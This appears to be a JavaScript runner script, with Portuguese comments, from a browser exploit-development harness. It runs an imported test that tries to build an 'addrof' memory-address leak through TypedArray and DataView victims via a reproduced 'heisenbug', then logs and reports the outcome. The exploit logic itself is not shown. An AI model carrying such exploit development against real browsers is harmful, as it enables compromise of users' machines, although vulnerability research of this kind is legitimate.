// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import { 
    executeTypedArrayVictimAddrofTest_CorruptTargetInProbe_FixConstError,   // NOME DA FUNÇÃO ATUALIZADO
    FNAME_MODULE_TYPEDARRAY_ADDROF_V74A_FCE    // NOME DO MÓDULO ATUALIZADO
} from './testArrayBufferVictimCrash.mjs';

async function runHeisenbugReproStrategy_TypedArrayVictim() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_CorruptTargetInProbe_FixConstError"; // Atualizado
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);

    const result = await executeTypedArrayVictimAddrofTest_CorruptTargetInProbe_FixConstError(); // Atualizado

    // O total de chamadas da sonda é logado dentro de execute... e resetado.
    // Usamos o result.total_probe_calls (que será 0) ou confiamos no log interno do execute...
    // O importante é que o array all_probe_calls_for_analysis é retornado corretamente.
    if(result.total_probe_calls !== undefined) { // Se a propriedade existir no resultado
        logS3(`  (Runner) Total de chamadas da sonda (valor do return): ${result.total_probe_calls}`, "info", FNAME_RUNNER);
    }
    if (result.all_probe_calls_for_analysis && result.all_probe_calls_for_analysis.length > 0) {
        logS3(`  (Runner) Detalhes de TODAS as chamadas da sonda: ${JSON.stringify(result.all_probe_calls_for_analysis, null, 2)}`, "dev_verbose");
    } else {
        logS3(`  (Runner) Nenhum detalhe de chamada da sonda foi retornado (all_probe_calls_for_analysis).`, "warn", FNAME_RUNNER);
    }

    if (result.errorCapturedMain) { 
        logS3(`   RESULTADO: ERRO JS CAPTURADO: ${result.errorCapturedMain.name} - ${result.errorCapturedMain.message}.`, "error", FNAME_RUNNER);
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V74A_FCE}: ERR ${result.errorCapturedMain.name}`;
    } else {
        logS3(`  RESULTADO: Completou. Stringify Output Final (Parseado): ${result.stringifyResult ? JSON.stringify(result.stringifyResult, null, 2) : 'N/A'}`, "good", FNAME_RUNNER);
        logS3(`  (Runner) Detalhes da ÚLTIMA sonda (via result.toJSON_details): ${result.toJSON_details ? JSON.stringify(result.toJSON_details) : 'N/A'}`, "info", FNAME_RUNNER);


        let heisenbugIndication = false; 
        if (result.all_probe_calls_for_analysis) { // Usar o array completo para determinar a indicação
            const fuzzCaptured = result.all_probe_calls_for_analysis.find(d => d && (d.this_is_leak_target_AB || d.this_is_leak_target_DV) && d.fuzz_capture_status !== null);
            if (fuzzCaptured) {
                 logS3(`  (Runner)!!!! ALVO DE LEAK (${fuzzCaptured.this_type}) TEVE FUZZING CAPTURADO (Call #${fuzzCaptured.call_number}) !!!!`, "critical", FNAME_RUNNER);
                 heisenbugIndication = true;
            } else {
                 const call1Details = result.all_probe_calls_for_analysis.find(d => d && d.call_number === 1);
                 if (call1Details && (call1Details.payload_AB || call1Details.payload_DV)) { 
                    logS3(`  (Runner) INDICAÇÃO DE HEISENBUG: C1_details foi populado com payloads na Call #1.`, "info", FNAME_RUNNER);
                    heisenbugIndication = true; 
                } else {
                     logS3(`  (Runner) ALERT: Nenhuma indicação clara de Heisenbug (alvos não atingidos ou C1 não populado).`, "error", FNAME_RUNNER);
                }
            }
        }

        let anyAddrofSuccess = (result.addrof_A_result && result.addrof_A_result.success) || (result.addrof_B_result && result.addrof_B_result.success);

        if (result.addrof_A_result) {
            logS3(`    ADDROF ArrayBufferTarget: ${result.addrof_A_result.msg}`, result.addrof_A_result.success ? "vuln" : "warn", FNAME_RUNNER);
        }
        if (result.addrof_B_result) {
            logS3(`    ADDROF DataViewTarget: ${result.addrof_B_result.msg}`, result.addrof_B_result.success ? "vuln" : "warn", FNAME_RUNNER);
        }

        if (anyAddrofSuccess) { document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V74A_FCE}: Addr SUCCESS!`; }
        else if (heisenbugIndication) { document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V74A_FCE}: Target Reached, Addr Fail`; }
        else { document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V74A_FCE}: No Target?`; }
    }
    logS3(`  Título da página: ${document.title}`, "info");
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`==== Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V74A_FCE}_MainOrchestrator`; // Atualizado
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== User Agent: ${navigator.userAgent} ====`,'info', FNAME_ORCHESTRATOR);
    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}): Reproduzindo Heisenbug com TypedArray Vítima (CorruptTargetInProbe_FixConstError) ====`, 'test', FNAME_ORCHESTRATOR); // Atualizado

    await runHeisenbugReproStrategy_TypedArrayVictim();

    logS3(`\n==== Script 3 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    if (runBtn) runBtn.disabled = false;

    if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V74A_FCE)) { // Atualizado
        if (!document.title.includes("CRASH") && !document.title.includes("RangeError") &&
            !document.title.includes("SUCCESS") && !document.title.includes("Addr Fail") &&
            !document.title.includes("ERR") && 
            !document.title.includes("Target Reached") && !document.title.includes("No Target") ) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V74A_FCE} Concluído`; // Atualizado
        }
    }
}
